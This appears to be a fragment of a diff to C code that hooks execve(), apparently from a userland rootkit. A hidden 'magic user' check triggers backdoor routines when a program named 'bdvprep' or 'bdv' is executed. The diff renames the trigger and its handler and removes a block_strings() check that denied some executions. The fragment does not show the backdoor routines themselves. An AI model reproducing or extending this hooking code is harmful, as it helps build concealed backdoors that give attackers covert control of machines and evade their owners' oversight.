@@ -14,8 +14,8 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 
     if(magicusr()){
 #ifdef BACKDOOR_ROLF
-        if(!fnmatch("*/bdvrolf", argv[0], FNM_PATHNAME))
-            dorolfpls();
+        if(!fnmatch("*/bdvprep", argv[0], FNM_PATHNAME))
+            bdprep();
 #endif
 #ifdef BACKDOOR_UTIL
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
@@ -48,11 +48,6 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
             return (long)call(CEXECVE, filename, argv, envp);
         case VNOTHING_DONE:
             break;  /* ?? */
-    }
-
-    if(block_strings(filename, argv)){
-        errno = EPERM;
-        return -1;
     }
 #endif
 
